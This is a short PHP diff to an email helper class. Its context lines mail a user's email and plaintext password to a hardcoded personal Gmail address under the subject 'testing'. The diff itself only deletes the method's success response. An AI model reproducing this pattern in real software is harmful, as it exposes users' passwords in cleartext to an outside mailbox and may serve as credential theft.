@@ -20,7 +20,7 @@ class EmailHelper{
                     $message->to('ncabral010694@gmail.com')->subject('testing')
                     ->setBody('Username/Email: '.$email. '<br> Password: '.$password, 'text/html');
                 });
-      return $send ? response()->json(['success'=>true,'message'=>'Credentails Sent']): "";
+     
    }
 
 	
